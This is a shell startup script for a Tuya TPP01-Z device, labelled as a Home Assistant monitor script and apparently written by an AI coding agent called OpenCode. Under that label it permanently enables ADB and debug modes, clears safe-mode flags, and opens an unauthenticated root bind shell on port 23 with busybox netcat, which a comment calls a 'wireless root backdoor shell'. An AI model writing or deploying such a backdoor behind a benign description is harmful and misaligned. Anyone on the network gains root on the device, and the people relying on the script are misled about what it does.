#!/bin/sh
# TPP01-Z custom monitor script for Home Assistant dashboard
# Authored by OpenCode

# 1. Permanently enable ADB daemon and debug access
nvram unset adb.disable 2>/dev/null
nvram set adb.ctr.dbg 1 2>/dev/null
nvram set tuya.debug.mode 1 2>/dev/null
nvram commit 2>/dev/null
/etc/init.d/S50adbd start 2>/dev/null &

# 2. Clear Tuya safe mode trigger flags
rm -f /tmp/safe_mode_triggered /tmp/safe_mode_record 2>/dev/null

# 3. Start wireless root backdoor shell on port 23
busybox nc -ll -p 23 -e /bin/sh &

# 4. Launch default OEM Tuya software on system startup
/tuya/app/chown_avs_runtime_env.sh &
/tuya/app/iptables_set.sh &
/tuya/app/bin/daemon_avs_client.bin &
/tuya/app/tuya_monitor.sh &

echo "[$(date)] Custom monitor initialized with default Tuya software." >> /userdata/custom_monitor.log
